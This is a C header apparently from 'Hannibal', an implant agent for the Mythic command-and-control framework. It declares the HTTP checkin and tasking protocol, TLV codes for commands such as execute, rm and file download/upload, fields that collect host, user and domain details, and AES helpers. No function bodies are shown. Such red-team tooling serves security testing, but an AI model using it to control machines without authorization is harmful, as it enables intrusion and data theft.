#ifndef PROFILE_MYTHIC_HTTP_H
#define PROFILE_MYTHIC_HTTP_H

#include "hannibal.h"
#include "utility_http_wininet.h"
#include "utility_base64.h"
#include "utility_strings.h"
#include "utility_serialization.h"
#include "hannibal_tasking.h"
#include "utility_encryption_helpers.h"


// Internal Profile Functionality
void mythic_http_checkin();
void mythic_http_get_tasks();
void mythic_http_post_tasks();


//////////////////////////////////////////// Message Encoding TLVs

///////////////////////// Checkin Message
// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin

///////////////////////// Get Tasks
// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/action_get_tasking

// Type definitions
typedef unsigned char UINT8;
typedef unsigned short UINT16;
typedef unsigned int UINT32;
typedef unsigned long long UINT64;

#define MESSAGE_TYPE_CHECKIN 1
#define MESSAGE_TYPE_CHECKIN_RESPONSE 2
#define MESSAGE_TYPE_GET_TASKS 3
#define MESSAGE_TYPE_GET_TASKS_RESPONSE 4
#define MESSAGE_TYPE_POST_TASKS 5
#define MESSAGE_TYPE_START_DOWNLOAD 6
#define MESSAGE_TYPE_CONTINUE_DOWNLOAD 7
#define MESSAGE_TYPE_POST_TASKS_RESPONSE 8
#define MESSAGE_TYPE_FILE_UPLOAD 9


// TLV structure
typedef struct {
    UINT8 type;
    UINT32 length;
    UINT8 *value;
} TLV;

// TLV Types
enum TLVType {

     // Checkin Message TLVs
    TLV_CHECKIN_UUID = 2,
    TLV_CHECKIN_IPS = 3,
    TLV_CHECKIN_OS = 4,
    TLV_CHECKIN_USER = 5,
    TLV_CHECKIN_HOST = 6,
    TLV_CHECKIN_PID = 7,
    TLV_CHECKIN_ARCHITECTURE = 8,
    TLV_CHECKIN_DOMAIN = 9,
    TLV_CHECKIN_INTEGRITY_LEVEL = 10,
    TLV_CHECKIN_EXTERNAL_IP = 11,
    TLV_CHECKIN_ENCRYPTION_KEY = 12,
    TLV_CHECKIN_DECRYPTION_KEY = 13,
    TLV_CHECKIN_PROCESS_NAME = 14,

    // CHECKIN_RESPONSE
    TLV_CHECKIN_RESPONSE_ID = 15,

    // CMD TLVs
    TLV_CMD_ID = 16,
    
    // ls
    TLV_CMD_LS_PARAM_PATH = 17,
    TLV_CMD_LS_PARAM_HOST = 18,

    // POST TASKING
    TLV_POST_TASKING = 20,
    TLV_POST_TASKING_ID = 21,
    TLV_POST_TASKING_CONTENT = 22,

    // Download File Agent > Mythic
    TLV_START_DOWNLOAD_CHUNK_COUNT = 23,
    TLV_START_DOWNLOAD_CHUNK_SIZE = 24,
    TLV_DOWNLOAD_PARAM_PATH = 25,
    TLV_CONTINUE_DOWNLOAD_CHUNK_NUMBER = 26,
    TLV_CONTINUE_DOWNLOAD_FILE_ID = 27,
    TLV_CONTINUE_DOWNLOAD_FILE_DATA = 28,
    TLV_START_DOWNLOAD_FILEPATH = 29,

    // Upload File Mythic > Agent
    TLV_UPLOAD_REMOTE_PATH = 30,
    TLV_UPLOAD_FILE_UUID = 31,
    TLV_UPLOAD_CHUNK_NUMBER = 32,
    TLV_UPLOAD_CHUNK_SIZE = 33,
    TLV_UPLOAD_CHUNK_COUNT = 34,

    // execute_hbin
    TLV_CMD_EXECUTE_HBIN_ARGS = 35,
    TLV_CMD_EXECUTE_HBIN_BIN = 36,

    // rm
    TLV_CMD_RM_PATH = 37,

    // cd
    TLV_CMD_CD_PATH = 38,

    // cp
    TLV_CMD_CP_SRC_PATH = 39,
    TLV_CMD_CP_DST_PATH = 40,

    // mv
    TLV_CMD_MV_SRC_PATH = 41,
    TLV_CMD_MV_DST_PATH = 42,

    // mkdir
    TLV_CMD_MKDIR_PATH = 43,

    // execute
    TLV_CMD_EXECUTE_PATH = 44,

    // sleep
    TLV_CMD_SLEEP_INTERVAL = 45,
    TLV_CMD_SLEEP_JITTER = 46,

};

// Checkin Message structure
typedef struct _CheckinMessage {
    UINT8 action;
    char *uuid; // Mythic mangles if it's WCHAR
    WCHAR **ips;
    UINT32 ips_count;
    WCHAR *os;
    WCHAR *user;
    WCHAR *host;
    UINT32 pid;
    WCHAR *architecture;
    WCHAR *domain;
    UINT32 integrity_level;
    WCHAR *external_ip;
    WCHAR *encryption_key;
    WCHAR *decryption_key;
    WCHAR *process_name;
} CheckinMessage;

typedef struct _CheckinMessageResponse {
    char *uuid;
    UINT8 status;
} CheckinMessageResponse;

typedef struct _GetTasksMessage {
    UINT8 action;
    UINT8 tasking_size; // Should be an int for -1, but we're going to say 0 means get all tasks.
    UINT8 get_delegate_tasks; // For the moment pivot agents not supported
} GetTasksMessage;

typedef struct _SERIALIZE_POST_TASKS_INFO {
    UINT8 *buffer;
    int buffer_size;
} SERIALIZE_POST_TASKS_INFO;

typedef struct _MYTHIC_HTTP_ENCRYPTION_MSG {
    char *buffer;
    int buffer_size;
} MYTHIC_HTTP_ENCRYPTION_MSG;

UINT8* serialize_checkin(const CheckinMessage *message, UINT32 *outputSize);
CheckinMessageResponse* deserialize_checkin_reponse(UINT8 *buffer);

UINT8* serialize_get_tasking_msg(const GetTasksMessage *message, UINT32 *output_size);
void deserialize_get_tasks_response(char *buffer);

SERIALIZE_POST_TASKS_INFO serialize_post_tasks(UINT8 *buffer, int buffer_size, LPCSTR task_uuid);
UINT8 deserialize_post_tasks_response(char *buffer);


#ifdef INCLUDE_CMD_DOWNLOAD
void mythic_http_start_file_download(FILE_DOWNLOAD *download);
void mythic_http_continue_file_downloads();
#endif

#ifdef INCLUDE_CMD_UPLOAD
void mythic_http_start_file_upload(FILE_UPLOAD *upload);
void mythic_http_continue_file_uploads();
#endif


MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer, int buffer_size);
MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer, int buffer_size);

#endif